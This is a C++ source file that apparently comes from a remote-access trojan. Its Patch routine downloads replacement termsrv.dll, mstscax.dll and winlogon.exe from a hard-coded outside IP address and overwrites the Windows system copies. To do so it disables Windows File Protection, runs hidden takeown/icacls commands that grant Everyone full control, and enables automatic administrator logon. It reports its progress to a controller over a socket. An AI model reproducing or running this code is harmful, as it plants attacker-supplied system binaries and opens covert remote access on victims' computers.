#include "stdafx.h"
#include "Patcher.h"
#include "PatchRegister.h"
#include "Strsafe.h"
#include "Load.h"
#include "Urlmon.h"
#include "md5.h"
#include "../ClientOps.h"

#pragma comment(lib,  "Version.lib")
#pragma comment(lib,  "Urlmon.lib")


bool AutoLogin(bool sw_ON_OFF)
{
	if(sw_ON_OFF)
	{
		if(SetRegValueSZ(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"AutoAdminLogon", L"1", 4) != 0) return false;
		WCHAR user[256]={0};
		DWORD userLen = 256;
		GetUserNameW(&user[0], &userLen);
		userLen=(userLen+1)*sizeof(WCHAR);
		//MessageBoxW(NULL, &user[0], L"CurrentUser", 0);
		if(SetRegValueSZ(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"DefaultUserName", &user[0], userLen) != 0) return false;
	}
	else
	{
		HKEY Key;
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &Key) != ERROR_SUCCESS) return false;
		if(RegDeleteValue(Key, L"AutoAdminLogon") != ERROR_SUCCESS)
		{
			RegCloseKey(Key);
			return false;
		}
		RegCloseKey(Key);
	}
	return true;
}

bool AutoLoginCheck()
{
	BYTE Data[512] = {0};
	DWORD Type= 0;
	DWORD DataLen = 0;
	bool res = IsValueExist(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"AutoAdminLogon", &Data[0], &DataLen, &Type);
	return res;
}

void CalcMD5Hash(BYTE *Data, DWORD DataSize, char* MD5)
{
	int Error = 0;
	MD5_CTX ctx; 

	MD5Init(&ctx);
	MD5Update( &ctx, (unsigned char*)Data, DataSize );

	unsigned char* UidHash = (unsigned char*)malloc(16);

	MD5Final((unsigned char *)UidHash, &ctx );
	for( int i = 0 , j = 0; i < 16; i++, j+=2 )
	{
		wsprintfA( MD5+j, "%02X", UidHash[i] );
	}
	free(UidHash);
}

//////////////////////////////////////////////////////////////////////////////////////////////////
// Get the PE file version info
// Last modified, 
// 2008.12.24, added bOK
//
BOOL GetDllFileVersion(LPCTSTR pszFileName, PMYVERSIONINFO pVersionInfo)
{
	// Check struct size
	if (sizeof(MYVERSIONINFO) != pVersionInfo->dwSize)
		return FALSE;

	BOOL	bOK			= FALSE;
	DWORD   dwHandle	= NULL;   
	DWORD   dwVerSize;
	
	// Get the file version info size
	dwVerSize = GetFileVersionInfoSize(pszFileName, &dwHandle);
	if(dwVerSize == 0)
		return FALSE;

	LPVOID				pbuf		= NULL; 
	UINT				uLen		= 0;   
	VS_FIXEDFILEINFO	*pFileInfo;   

	pbuf = malloc(dwVerSize);
	if(!pbuf)
		return FALSE;
  
	__try
	{
		bOK = GetFileVersionInfo(pszFileName, dwHandle, dwVerSize, pbuf);
		if (!bOK)
			__leave;

		bOK	= VerQueryValue(pbuf, (LPTSTR)("\\"), (LPVOID*)&pFileInfo, &uLen);   
		if (!bOK)
			__leave;

		// get data
		pVersionInfo->wMajorVersion		= HIWORD(pFileInfo->dwProductVersionMS);     
		pVersionInfo->wMinorVersion		= LOWORD(pFileInfo->dwProductVersionMS);   
		pVersionInfo->wBuildNumber		= HIWORD(pFileInfo->dwProductVersionLS);   
		pVersionInfo->wRevisionNumber	= LOWORD(pFileInfo->dwProductVersionLS);

		StringCbPrintf(pVersionInfo->szShortVersion, 
						sizeof(pVersionInfo->szShortVersion), L"%u.%u.%u.%u", \
						pVersionInfo->wMajorVersion, pVersionInfo->wMinorVersion, \
						pVersionInfo->wBuildNumber, pVersionInfo->wRevisionNumber
						);


		bOK		= TRUE;


	}
	__finally
	{
		// clean up
		
		if (pbuf)
			free(pbuf);

	}

	return   bOK;

} // GetDllFileVersion()

///////////////////////////////////////////////////////////////////////////////////////////////////////
////
//// Read file to buffer, return buffer size, and buffer pointer
////
//PVOID ReadFileToBuffer(
//					   LPTSTR	pszFile,			// in,  File name
//					   PDWORD	pdwBufferSize		// out, Buffer size
//					   )		
//{
//	HANDLE		hFile;						// Handle of the File
//	DWORD		dwFileSize		= 0;
//	DWORD		dwBytesRead		= 0;
//	PVOID		pBuffer			= NULL;		// Pointer to File buffer
//	PDWORD		pdwFileReadStart = 0;		// I/O,  Start offset to read
//	PDWORD		pdwFileReadEnd = 0;			// I/O,  End offset
//
//	*pdwBufferSize	= 0;
//
//	// Try to open file
//	hFile = CreateFile(pszFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, NULL);
//	if (hFile == INVALID_HANDLE_VALUE)
//	{
//		// Fail to open file
//		return NULL;
//	}
//
//	dwFileSize = GetFileSize(hFile, NULL);
//
//	if (dwFileSize == 0)
//	{
//		CloseHandle(hFile);
//		return NULL;
//	}
//
//
//	// Allocate memory
//	*pdwBufferSize = dwFileSize;
//	pBuffer = malloc(dwFileSize);
//
//	// ZeroMemory(pBuffer, *pdwBufferSize);
//
//	// seek to start of range
//	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
//
//	// Read data
//	BOOL bRet = ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, 0);
//	CloseHandle(hFile);
//
//	// If fail to read file, then exit.
//	if (!bRet)
//	{
//		free(pBuffer);
//		return NULL;
//	}
//
//	return pBuffer;
//}

// Chect OS version if is NT5
__inline BOOL isNT5(void)
{
	DWORD		dwVersion	= GetVersion();

	if (((DWORD)LOBYTE(LOWORD(dwVersion))) == 5) 
	{
		if (((DWORD)HIBYTE(LOWORD(dwVersion))) > 0) // Windows XP/2003
		{
			return TRUE;
		}
	}

	return FALSE;
}

// Chect OS version if is NT6
__inline BOOL isNT6(void)
{
	DWORD		dwVersion	= GetVersion();

	if (((DWORD)LOBYTE(LOWORD(dwVersion))) == 6) 
	{
		return TRUE;
	}

	return FALSE;
}

//////////////////////////////////////////////////////////////////////////////////////////////////
//
// Run console program in Hidden Console
//
BOOL RunHiddenConsoleW(LPWSTR pszCmdLine, BOOL bWait)
{ 	
	BOOL bRet			= FALSE;

	PROCESS_INFORMATION ProcInfo		= {0};
	STARTUPINFOW		StartupInfo		= {0};
	DWORD				dwCreationFlag	= 0;

	//********************* This Section only for run hidden console (Start) ***********************
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcInfo, sizeof(ProcInfo));
	StartupInfo.cb			= sizeof(StartupInfo);			// The size of the structure, in bytes.
	StartupInfo.dwFlags		= STARTF_USESHOWWINDOW;			// The wShowWindow member is valid.
	StartupInfo.wShowWindow = SW_HIDE;
	if(GetCurDesk() == Second)
		StartupInfo.lpDesktop = SECOND_DESK_NAMEW;

	dwCreationFlag			= CREATE_UNICODE_ENVIRONMENT;	// Using unicode
	
	dwCreationFlag |= CREATE_NEW_CONSOLE;					// run cmdline in console

	//********************* This Section only for run hidden console (End) *************************

	bRet = CreateProcessW(NULL, pszCmdLine, 
			NULL, NULL, FALSE, dwCreationFlag, NULL, NULL, &StartupInfo, &ProcInfo);


	// if bWait is true, then wait for process to close.
	if (bRet)
	{
		if (bWait)
			WaitForSingleObject(ProcInfo.hProcess, INFINITE);

		//CloseHandle(UlongToHandle(ProcInfo.dwProcessId));
		//CloseHandle(UlongToHandle(ProcInfo.dwThreadId));
		
	}

	return bRet;

} // RunHiddenConsoleW()
BOOL RunHiddenConsoleA(LPSTR pszCmdLine, BOOL bWait)
{ 	
	BOOL bRet			= FALSE;

	PROCESS_INFORMATION ProcInfo		= {0};
	STARTUPINFOA		StartupInfo		= {0};
	DWORD				dwCreationFlag	= 0;

	//********************* This Section only for run hidden console (Start) ***********************
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcInfo, sizeof(ProcInfo));
	StartupInfo.cb			= sizeof(StartupInfo);			// The size of the structure, in bytes.
	StartupInfo.dwFlags		= STARTF_USESHOWWINDOW;			// The wShowWindow member is valid.
	StartupInfo.wShowWindow = SW_HIDE;
	if(GetCurDesk() == Second)
		StartupInfo.lpDesktop = SECOND_DESK_NAMEA;

	dwCreationFlag			= CREATE_UNICODE_ENVIRONMENT;	// Using unicode
	
	dwCreationFlag |= CREATE_NEW_CONSOLE;					// run cmdline in console

	//********************* This Section only for run hidden console (End) *************************

	bRet = CreateProcessA(NULL, pszCmdLine, 
			NULL, NULL, FALSE, dwCreationFlag, NULL, NULL, &StartupInfo, &ProcInfo);


	// if bWait is true, then wait for process to close.
	if (bRet)
	{
		if (bWait)
			WaitForSingleObject(ProcInfo.hProcess, INFINITE);

		//CloseHandle(UlongToHandle(ProcInfo.dwProcessId));
		//CloseHandle(UlongToHandle(ProcInfo.dwThreadId));
		
	}

	return bRet;

} // RunHiddenConsoleA()

HRESULT DisableWFP(LPTSTR pszFileName) 
{
	HMODULE	hmod = LoadLibrary( L"\sfc_os.dll");

	if (hmod == NULL)	// Fail to load sfc_os.dll
		return 1;

	DllfnSetSfcFileException	fnSetSfcFileException;

	// No. 5 function in sfc_os.dll
	fnSetSfcFileException=(DllfnSetSfcFileException)GetProcAddress(hmod,  MAKEINTRESOURCEA(5));

	HRESULT ret = fnSetSfcFileException(0, pszFileName, -1);

	FreeLibrary(hmod);

	return ret;

} // DisableWFP()

bool WFP(LPTSTR pszFile)
{
	TCHAR		szCmd[500]				= {0};
	HANDLE		hFile;
	DWORD		dwFileSize		= 0;

	if (isNT6())	// >= vista
	{
		wsprintf(szCmd, L"takeown /f  %s", pszFile); 
		RunHiddenConsoleW(szCmd, TRUE);
		wsprintf(szCmd, L"icacls %s /grant ", pszFile); 
		lstrcat(szCmd, L"%username%:F");
		RunHiddenConsoleW(szCmd, TRUE);
		wsprintf(szCmd, L"icacls %s /grant *S-1-1-0:(F)", pszFile);
		RunHiddenConsoleW(szCmd, TRUE);
	}

	if (isNT5())	// >= 2000
	{
		DisableWFP(pszFile);
	}

	Sleep(200);
	return 0;
}

TCHAR* GetTempName()
{
	TCHAR *TempPath = (TCHAR*)malloc( MAX_PATH*sizeof(TCHAR) );
	if(!TempPath) return NULL;

	TCHAR *FileName = (TCHAR*)malloc( MAX_PATH*sizeof(TCHAR) );
	if(!FileName) 
	{
		free(TempPath);
		return NULL;
	}

	GetTempPath( MAX_PATH, TempPath );
	GetTempFileName( TempPath, L"", 0, FileName );

	free( TempPath );

	return FileName;
}

LPTSTR deleteFileViaMove(LPTSTR FileName, LPDWORD error)
{
	if(GetFileAttributes(FileName) == -1)
	{
		*error = 1;
		return NULL;
	}
	TCHAR* tmpFileName = GetTempName();
	if(!DeleteFile(tmpFileName))
	{
		if(tmpFileName != NULL) free(tmpFileName);
		*error = 2;
		return NULL;
	}
	if(!MoveFile(FileName, tmpFileName))
	{
		*error = 3;
		DWORD err = GetLastError();
		free(tmpFileName);
		return NULL;
	}
	return tmpFileName;
}

void SendPatcherMess(WCHAR* msg, SOCKET s, DWORD timestamp)
{
	Sleep(100);
	PacketBuffer reply;
	reply.Create( PK_CS_PATCH_TERMSRV, timestamp, (wcslen(msg)+1)*sizeof(TCHAR), msg);
	reply.Send( s );
}

int Patch(LPVOID Param)
{
	DWORD timestamp = ((SendParams*)Param)->timestamp;
	SOCKET s = ((SendParams*)Param)->socket;

	SendPatcherMess(L"PATCH: Patching Started", s, timestamp);
	
	DWORD err = 0;

	DWORD dwLenTermSrv  = 0;
	LPVOID BufferTermSrv = DownloadPlugin("http://94.240.148.127/dll/termsrv.dll.cr", &dwLenTermSrv); // http://192.168.1.42/drupal.test/
	DWORD dwLenMstscax = 0;
	LPVOID BufferMstscax = DownloadPlugin("http://94.240.148.127/dll/mstscax.dll.cr", &dwLenMstscax);
	DWORD dwLenWinlogon = 0;
	LPVOID BufferWinlogon = DownloadPlugin("http://94.240.148.127/dll/winlogon.exe.cr", &dwLenWinlogon);
	
	char* md5TermSrv = (char*)malloc(32);
	char* md5Mstscax = (char*)malloc(32);
	char* md5Winlogon = (char*)malloc(32);
	ZeroMemory(md5TermSrv, 32);
	ZeroMemory(md5Mstscax, 32);
	ZeroMemory(md5Winlogon, 32);
	
	CalcMD5Hash((BYTE*)BufferTermSrv, dwLenTermSrv, md5TermSrv);
	CalcMD5Hash((BYTE*)BufferMstscax, dwLenMstscax, md5Mstscax);
	CalcMD5Hash((BYTE*)BufferWinlogon, dwLenWinlogon, md5Winlogon);

	if(strcmp(&md5TermSrv[0], "A66E342466834E95CD7A7BFAEB7771D2") != 0)
	{
		//MessageBox(NULL, L"File termsrv.dll incorrect loaded", L"ERROR", 0);
		SendPatcherMess(L"PATCH: termsrv.dll incorrect loaded", s, timestamp);
		goto error;
	}
	if(strcmp(&md5Mstscax[0], "9F22DD4426AB379D42FBB30CA5C8EDA7") != 0)
	{
		//MessageBox(NULL, L"File termsrv.dll incorrect loaded", L"ERROR", 0);
		SendPatcherMess(L"PATCH: File mstscax.dll incorrect loaded", s, timestamp);
		goto error;
	}
	if(strcmp(&md5Winlogon[0], "9486D849B659980FE7CE875FF64A776C") != 0)
	{
		//MessageBox(NULL, L"File termsrv.dll incorrect loaded", L"ERROR", 0);
		SendPatcherMess(L"PATCH: winlogon.exe incorrect loaded", s, timestamp);
		goto error;
	}
	
	/*if(dwLenTermSrv == 0)
	{
		//MessageBox(NULL, L"Can`t load termsrv.dll", L"ERROR", 0);
		SendPatcherMess(L"PATCH: Can`t load termsrv.dll", s, timestamp);
		goto error;
	}
	if(dwLenMstscax == 0)
	{
		//MessageBox(NULL, L"Can`t load mstscax.dll", L"ERROR", 0);
		SendPatcherMess(L"PATCH: Can`t load mstscax.dll", s, timestamp);
		goto error;
	}
	if(dwLenWinlogon == 0)
	{
		//MessageBox(NULL, L"Can`t load winlogon.exe", L"ERROR", 0);
		SendPatcherMess(L"PATCH: Can`t load winlogon.exe", s, timestamp);
		goto error;
	}*/

	SendPatcherMess(L"PATCH: Files Loaded", s, timestamp);

	BOOL res;
	LPVOID res_v;
	LPVOID tmpTermSrv  = NULL;
	LPVOID tmpMstscax  = NULL;
	LPVOID tmpWinlogon = NULL;
	DWORD error = 0;

	LPVOID tmpTermSrvCache  = NULL;
	LPVOID tmpMstscaxCache  = NULL;

	{
	////// termsrv.dll
	WCHAR sPath[MAX_PATH] = {0};
	WCHAR sPathCache[MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL, SHGFP_TYPE_CURRENT, sPath);
	wcscpy(&sPathCache[0], &sPath[0]);
	wcscat(&sPath[0], L"\\termsrv.dll");
	wcscat(&sPathCache[0], L"\\dllcache\\termsrv.dll");

	WFP(&sPath[0]);
	WFP(&sPathCache[0]);

	tmpTermSrv = deleteFileViaMove(&sPath[0], &error);
	if(tmpTermSrv == NULL)
	{
		SendPatcherMess(L"PATCH: Can`t move termsrv.dll -> %TMP%\\termsrv.dll", s, timestamp);
		//MessageBox(NULL, L"Can`t move termsrv.dll -> %TMP%\\termsrv.dll", L"ERROR", 0);
		goto error;
	}
	
	tmpTermSrvCache = deleteFileViaMove(&sPathCache[0], &error);
	if(tmpTermSrvCache == NULL && error != 1)
	{
		SendPatcherMess(L"PATCH: Can`t move dllcache\\termsrv.dll -> %TMP%\\termsrv.dll", s, timestamp);
		//MessageBox(NULL, L"Can`t move dllcache\\termsrv.dll -> %TMP%\\termsrv.dll", L"ERROR", 0);
		goto error;
	}

	HANDLE hFile = CreateFile(&sPath[0], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		//err = GetLastError();
		SendPatcherMess(L"PATCH: Can`t create %system%\\termsrv.dll", s, timestamp);
		//MessageBox(NULL, L"Can`t create %system%\\termsrv.dll", L"ERROR", 0);
		MoveFile((TCHAR*)tmpTermSrv, &sPath[0]);
		goto error;
	}
	DWORD BitesWritten = 0;
	WriteFile(hFile, BufferTermSrv, dwLenTermSrv, &BitesWritten, NULL);
	if(BitesWritten != dwLenTermSrv)
	{
		SendPatcherMess(L"PATCH: BitesWritten != dwLenTermSrv", s, timestamp);
		//MessageBox(NULL, L"BitesWritten != dwLenTermSrv", L"ERROR", 0);
		CloseHandle(hFile);
		goto error;
	}
	CloseHandle(hFile);
	
	hFile = CreateFile(&sPathCache[0], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		//err = GetLastError();
		SendPatcherMess(L"PATCH: Can`t create %system%\\termsrv.dll", s, timestamp);
		//MessageBox(NULL, L"Can`t create %system%\\termsrv.dll", L"ERROR", 0);
		MoveFile((TCHAR*)tmpTermSrvCache, &sPathCache[0]);
		goto error;
	}
	BitesWritten = 0;
	WriteFile(hFile, BufferTermSrv, dwLenTermSrv, &BitesWritten, NULL);
	if(BitesWritten != dwLenTermSrv)
	{
		SendPatcherMess(L"PATCH: BitesWritten != dwLenTermSr", s, timestamp);
		//MessageBox(NULL, L"BitesWritten != dwLenTermSrv", L"ERROR", 0);
		CloseHandle(hFile);
		goto error;
	}
	CloseHandle(hFile);
	}

	{
	////// mstscax.dll
	WCHAR sPath[MAX_PATH] = {0};
	WCHAR sPathCache[MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL, SHGFP_TYPE_CURRENT, sPath);
	wcscpy(&sPathCache[0], &sPath[0]);
	wcscat(&sPath[0], L"\\mstscax.dll");
	wcscat(&sPathCache[0], L"\\dllcache\\mstscax.dll");

	WFP(&sPath[0]);
	WFP(&sPathCache[0]);

	tmpMstscax = deleteFileViaMove(&sPath[0], &error);
	if(tmpMstscax == NULL)
	{
		SendPatcherMess(L"PATCH: Can`t move mstscax.dll -> %TMP%\\mstscax.dll", s, timestamp);
		//MessageBox(NULL, L"Can`t move mstscax.dll -> %TMP%\\mstscax.dll", L"ERROR", 0);
		goto error;
	}
	
	tmpMstscaxCache = deleteFileViaMove(&sPathCache[0], &error);
	if(tmpMstscaxCache == NULL && error != 1)
	{
		SendPatcherMess(L"PATCH: Can`t move dllcache\\mstscax.dll -> %TMP%\\mstscax.dll", s, timestamp);
		//MessageBox(NULL, L"Can`t move dllcache\\mstscax.dll -> %TMP%\\mstscax.dll", L"ERROR", 0);
		goto error;
	}

	HANDLE hFile = CreateFile(&sPath[0], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		//err = GetLastError();
		SendPatcherMess(L"PATCH: Can`t create %system%\\mstscax.dll", s, timestamp);
		//MessageBox(NULL, L"Can`t create %system%\\mstscax.dll", L"ERROR", 0);
		MoveFile((TCHAR*)tmpMstscax, &sPath[0]);
		goto error;
	}
	DWORD BitesWritten = 0;
	WriteFile(hFile, BufferMstscax, dwLenMstscax, &BitesWritten, NULL);
	if(BitesWritten != dwLenMstscax)
	{
		SendPatcherMess(L"PATCH: BitesWritten != dwLenMstscax", s, timestamp);
		//MessageBox(NULL, L"BitesWritten != dwLenMstscax", L"ERROR", 0);
		CloseHandle(hFile);
		goto error;
	}
	CloseHandle(hFile);
	
	hFile = CreateFile(&sPathCache[0], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		//err = GetLastError();
		SendPatcherMess(L"PATCH: Can`t create %system%\\mstscax.dll", s, timestamp);
		//MessageBox(NULL, L"Can`t create %system%\\mstscax.dll", L"ERROR", 0);
		MoveFile((TCHAR*)tmpMstscaxCache, &sPathCache[0]);
		goto error;
	}
	BitesWritten = 0;
	WriteFile(hFile, BufferMstscax, dwLenMstscax, &BitesWritten, NULL);
	if(BitesWritten != dwLenMstscax)
	{
		SendPatcherMess(L"PATCH: BitesWritten != dwLenMstscax", s, timestamp);
		//MessageBox(NULL, L"BitesWritten != dwLenMstscax", L"ERROR", 0);
		CloseHandle(hFile);
		goto error;
	}
	CloseHandle(hFile);
	}


	{
	////// winlogon.exe
	WCHAR sPath[MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL, SHGFP_TYPE_CURRENT, sPath);
	wcscat(&sPath[0], L"\\winlogon.exe");

	WFP(&sPath[0]);
	
	tmpWinlogon = deleteFileViaMove(&sPath[0], &error);
	if(tmpWinlogon == NULL)
	{
		//MessageBox(NULL, L"Can`t move winlogon.exe -> %TMP%\\winlogon.exe", L"ERROR", 0);
		SendPatcherMess(L"PATCH: Can`t move winlogon.exe -> %TMP%\\winlogon.exe", s, timestamp);
		goto error;
	}
	OutputDebugString((LPCWSTR)tmpMstscax);

	HANDLE hFile = CreateFile(&sPath[0], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		//err = GetLastError();
		SendPatcherMess(L"PATCH: Can`t create %system%\\winlogon.exe", s, timestamp);
		//MessageBox(NULL, L"Can`t create %system%\\winlogon.exe", L"ERROR", 0);
		MoveFile((TCHAR*)tmpWinlogon, &sPath[0]);
		goto error;
	}
	DWORD BitesWritten = 0;
	WriteFile(hFile, BufferWinlogon, dwLenWinlogon, &BitesWritten, NULL);
	if(BitesWritten != dwLenWinlogon)
	{
		SendPatcherMess(L"PATCH: BitesWritten != dwLenWinlogon", s, timestamp);
		//MessageBox(NULL, L"BitesWritten != dwLenWinlogon", L"ERROR", 0);
		CloseHandle(hFile);
		goto error;
	}
	CloseHandle(hFile);
	}
	


	int reg_res = PatchXP();
	if(reg_res != 0)
	{
		WCHAR msg[200] = {0};
		wsprintfW(&msg[0], L"PATCH: Can`t edit registry - PatchXP()  %d", reg_res);
		SendPatcherMess(&msg[0], s, timestamp);
		//MessageBox(NULL, L"!PatchXP()", L"ERROR", 0);
		goto error;
	}

	SendPatcherMess(L"PATCH: Successfuly patched", s, timestamp);
	return true;

error:
	free(BufferTermSrv);
	free(BufferMstscax);
	free(BufferWinlogon);
	free(md5TermSrv);
	free(md5Mstscax);
	free(md5Winlogon);
	if(tmpTermSrv != NULL) free(tmpTermSrv);
	if(tmpMstscax != NULL) free(tmpMstscax);
	if(tmpWinlogon != NULL) free(tmpWinlogon);
	if(tmpTermSrvCache != NULL) free(tmpTermSrvCache);
	if(tmpMstscaxCache != NULL) free(tmpMstscaxCache);
	return false;
}



